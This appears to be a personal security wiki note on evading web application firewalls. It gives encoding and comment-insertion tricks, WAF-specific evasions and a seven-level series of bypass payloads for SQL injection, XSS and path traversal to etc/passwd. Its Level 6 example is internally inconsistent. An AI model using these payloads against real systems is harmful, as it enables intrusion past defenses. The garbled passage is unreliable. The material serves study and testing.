#webapplications

Web Application Firewalls (WAFs) like Cloudflare, ModSecurity, and AWS WAF filter requests for known attack patterns. Since they match signatures (and you control the payload), many bypasses exist.

## Common bypass techniques

### Encoding and obfuscation
| Technique | Example | When it works |
| --- | --- | --- |
| URL encoding | `..%2f..%2f` instead of `../..` | WAF checks decoded string; server decodes again |
| Double encoding | `..%252f` | Server decodes twice; WAF only decodes once |
| Unicode encoding | `%c0%af` as `/` | Different decoders handle Unicode differently |
| HTML entities | `&lt;script&gt;` as `<script>` | WAF checks raw HTML; browser decodes |
| Case variation | `<ScRiPt>` instead of `<script>` | WAF does case-sensitive match |
| Hex encoding | `\x3cscript\x3e` | Payload hidden in hex literals |
| Null bytes (old) | `shell.php%00.txt` | Old systems truncate at null; WAF doesn't |

### Polyglot/multi-format payloads
```
# Valid JSON with SQL injection inside
{"search": "test' OR '1'='1"}

# Valid XML with XXE
<?xml version="1.0"?><payload>...XXE...</payload>

# Valid CSV with CRLF injection
name,value
admin,true
# Injected header
```

The payload is valid for one format the WAF checks, but interpreted as another by the server.

### Comment insertion
```
# WAF signature: "union select"
# Bypass: use inline comments
un/**/ion se/**/lect ...

# SQL comment
union /*comment*/ select ...

# Different comment styles per database
MySQL:    #, --, /**/
PostgreSQL: --, /* */
MSSQL:    --, /* */
SQLite:   -- (only)
```

### Whitespace and formatting
```
# Normal:  /path/traversal
# Bypass:  /path/traversal////
# Bypass:  /path/./traversal
# Bypass:  /path/.%00/traversal

# SQL whitespace variations
WHERE    id=1      (spaces)
WHERE/**/id=1      (comment)
WHERE%09id=1       (tab encoded)
```

### Nested/stacked payloads
```
# If "drop" is blocked, nest it
dr/**/op table users
d/*r*/op table users
Dr0p table users  (mixed case)
```

### Timing delays
If pattern matching takes time, send valid requests between each byte of the malicious payload:
```
uni -- pause
on  -- pause
se  -- pause
le  -- pause
ct  -- pause
```

WAF timeout expires; payload assembles server-side.

## WAF-specific bypasses

| WAF | Known bypasses | Detection |
| --- | --- | --- |
| Cloudflare | `--random-agent` in sqlmap, `X-Forwarded-For` header spoofing | Check response headers for `server: cloudflare` |
| ModSecurity | Encoding variations, null bytes, buffer overflow tricks | Often used with Apache; bypass by encoding beyond ModSecurity's parser |
| AWS WAF | IP rotation, distributed requests, polyglot payloads | Check X-Amzn-Waf headers |
| Imperva | Fragmentation (split payload across multiple packets), slow requests | Often on CDN; timing-based bypasses work |

## Testing workflow

1. **Identify the WAF** — check response headers:
   ```bash
   curl -i https://target.com
   # Look for: Server, X-Frame-Options, Content-Security-Policy, X-Powered-By
   # Or tools: wafw00f target.com
   ```

2. **Test basic payload** — see if it's blocked:
   ```
   /search?q=<script>alert(1)</script>
   # Response: 403 Forbidden, 418 I'm a Teapot, or blocked page
   ```

3. **Try bypass variants** — in order of increasing complexity:
   - Case toggle: `<ScRiPt>`
   - URL encode: `%3Cscript%3E`
   - Double encode: `%253Cscript%253E`
   - Comment insert: `<s<!--x-->cript>`
   - Polyglot: Wrap in valid JSON/XML
   - Timing: Split payload across requests

4. **Verify bypass** — request is allowed (200) and payload executes server-side

## Where bypasses fail
- **Well-maintained WAFs** with normalized parsing and updated rules catch most bypasses
- **Defense-in-depth** — even if WAF is bypassed, server-side validation stops you
- **Rate limiting** — WAF doesn't block the payload, but limits requests/IP

**Important:** WAF bypasses are noise. The real vulnerability is on the server (missing input validation, unsafe function calls). Fix the server code, not the WAF evasion.

## WAF Levels 1-7 (Progressive Filtering)

As WAF rules get stronger, bypasses must get more creative. These levels show realistic progression from basic to advanced:

### Level 1 — Block known attack strings

**Rule:** Exact-match blocklist (e.g., `' OR 1=1 --`)

**Test:**
```
Input: ' OR 1=1 --
Filter: BLOCKED
```

**Bypass:** Change the exact string while preserving meaning
```
' OR 2=2 --     (different numbers)
' OR 1 LIKE 1 --
' OR 'a'='a
' /**/OR/**/1=1 --  (comment insertion)
' oR 1=1 --     (case toggle)
```

### Level 2 — Remove traversal sequences

**Rule:** Strip `../` from input

**Test:**
```
Input: ../private/demo.env
Filter: private/demo.env (traversal removed)
Application: file not found (stays in /app/public/)
```

**Bypass:** Nested traversal — `....//` becomes `../` after stripping
```
Input: ....//private/demo.env
Filter: remove "../" → ../private/demo.env
Application: resolves to /app/private/demo.env (VULNERABLE)
```

Why: Filter removes inner `../` but leaves outer `..//` → after first removal, `.../` becomes `../`

### Level 3 — Decode once, then inspect

**Rule:** URL-decode input, check for attacks, then pass to app

**Test:**
```
Input: %2e%2e%2f%2e%2e%2fetc%2fpasswd
Filter: Decoded to ../../../etc/passwd (BLOCKED)
```

**Bypass:** Double URL encoding — filter decodes once, app decodes again
```
Input: %252e%252e%252f%252e%252e%252fetc%252fpasswd
Filter: Decode once → %2e%2e%2f (still encoded, allowed)
Application: Decode again → ../../etc/passwd (VULNERABLE)
```

### Level 4 — Remove script tags

**Rule:** Strip `<script>` tags from input

**Test:**
```
Input: <script>alert(1)</script>
Filter: alert(1)
Application: No script tag, no XSS
```

**Bypass:** Nested tags — filter removes `<script>`, inner `<script>` appears
```
Input: <script><script>alert(1)</script></script>
Filter: Remove outer <script>...</script> → <script>alert(1)</script>
Browser: Inner tag executes (VULNERABLE)
```

### Level 5 — Inspect first parameter only

**Rule:** WAF checks first instance of a parameter, not all

**Test:**
```
GET /page?q=harmless&q=<script>alert(1)</script>
Filter: Sees q=harmless (allowed)
Application: Processes q=<script> (VULNERABLE)
```

This is [[HTTP Parameter Pollution]] — see that file for details and defenses.

### Level 6 — Scan JSON as raw text

**Rule:** Check raw JSON string for encoded attacks before decoding

**Test:**
```
JSON: {"q":"' OR 1=1 -- "}
Filter: Raw text check (looks for literal quote, doesn't see ', allowed)
JSON parser: ' → ' (quote appears)
Application: ' OR 1=1 processes normally (VULNERABLE)
```

**Why:** `'` is Unicode escape for quote. Raw-text check misses it; JSON decoder converts it.

### Level 7 — Inspect only first N bytes

**Rule:** WAF reads only first 128 bytes of request

**Test:**
```
POST with {"q":"harmless"} (fits in first 128 bytes)
Followed by {"q":"' OR 1=1 -- "} padded to 200 bytes

Filter: Sees only first 128, approves
Application: Reads full 200-byte body, processes injected query
```

**Bypass strategy:** Pad benign content to exceed WAF's inspection limit, append attack after

---

**Key insight:** Each level can be bypassed, but fixes get exponentially harder. The real mitigation is to **parameterize queries and encode output context** — fixing the application itself, not just the WAF.

## See also
- [[SQL Injection]], [[Cross-Site Scripting]], [[Command Injection]] — payloads that WAFs try to block
- [[Payload Reference]] — encoding techniques
- [[HTTP Parameter Pollution]] — multiple parameters same name
- [[Request Smuggling]] — WAF/app boundary disagreements
- `wafw00f` — identify which WAF is in use
